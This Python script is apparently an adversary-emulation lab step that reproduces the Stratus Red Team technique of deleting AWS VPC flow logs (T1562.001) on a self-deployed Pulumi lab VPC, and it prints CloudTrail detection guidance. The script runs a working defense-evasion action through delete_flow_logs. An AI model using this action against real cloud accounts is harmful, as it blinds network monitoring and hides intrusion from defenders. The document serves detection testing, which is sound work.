"""
Technique : aws.defense-evasion.vpc-remove-flow-logs
Tactic    : Defense Evasion (T1562.001)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.vpc-remove-flow-logs/

Pre-requisites:
  - Run `pulumi up` in ../infra/ first to create the VPC with flow logs.

How the attack works:
  VPC Flow Logs capture metadata about all IP traffic flowing through a VPC's
  network interfaces.  An attacker with ec2:DeleteFlowLogs can permanently
  remove this visibility, hiding subsequent lateral movement, port scanning,
  data exfiltration, and C2 communication from network-based detection.

Detection signal:
  - ec2:DeleteFlowLogs in CloudTrail.
  - Absence of VPC Flow Log events following the deletion.

Revert:
  - None. Flow logs are permanently deleted.
  - Run `pulumi up` in ../infra/ to recreate them.
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import json
import os
import subprocess
from pathlib import Path

import boto3
from botocore.exceptions import ClientError


# ── Helpers ───────────────────────────────────────────────────────────────────

def get_pulumi_outputs(stack_dir: str) -> dict:
    result = subprocess.run(
        ["pulumi", "stack", "output", "--json", "--show-secrets"],
        cwd=stack_dir,
        capture_output=True,
        text=True,
        env={**os.environ, "PULUMI_CONFIG_PASSPHRASE": os.environ.get("PULUMI_CONFIG_PASSPHRASE", "")},
    )
    if result.returncode != 0:
        print(f"[!] pulumi stack output failed: {result.stderr.strip()}")
        return {}
    return json.loads(result.stdout)


def banner(msg: str) -> None:
    print(f"\n{'=' * 60}")
    print(f"  {msg}")
    print(f"{'=' * 60}")


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    stack_dir   = str(Path(__file__).parent.parent / "infra")
    infra       = get_pulumi_outputs(stack_dir)
    flow_log_id = infra.get("flow_log_id", "")
    vpc_id      = infra.get("vpc_id",      "")

    if not flow_log_id:
        print("[!] flow_log_id not found in Pulumi outputs. Did you run `pulumi up`?")
        return

    session    = boto3.Session()
    ec2_client = session.client("ec2")

    # ── Step 1: Delete the VPC flow log ──────────────────────────────────────
    banner("Step 1 — Delete VPC flow log (DeleteFlowLogs)")
    try:
        response = ec2_client.delete_flow_logs(FlowLogIds=[flow_log_id])
        unsuccessful = response.get("Unsuccessful", [])
        if unsuccessful:
            for item in unsuccessful:
                print(f"  [!] Failed to delete {item.get('ResourceId')}: {item.get('Error', {}).get('Message')}")
        else:
            print(f"  [+] Flow log deleted: {flow_log_id}")
            print(f"  [+] VPC: {vpc_id}")
            print(f"  [!] CloudTrail event: ec2:DeleteFlowLogs")
            print(f"  [!] Network traffic logging is now DISABLED for this VPC.")
            print(f"  [!] This is a NON-REVERSIBLE operation (run `pulumi up` to restore).")
    except ClientError as exc:
        print(f"  [!] DeleteFlowLogs failed: {exc}")
        return

    banner("Complete")
    print("CloudTrail event generated: ec2:DeleteFlowLogs")
    print("\nDetection guidance:")
    print("  Alert on ec2:DeleteFlowLogs — loss of network visibility is a high")
    print("  confidence defense evasion indicator.")
    print("\nRun `pulumi up` in ../infra/ to recreate VPC flow logs.")


if __name__ == "__main__":
    main()
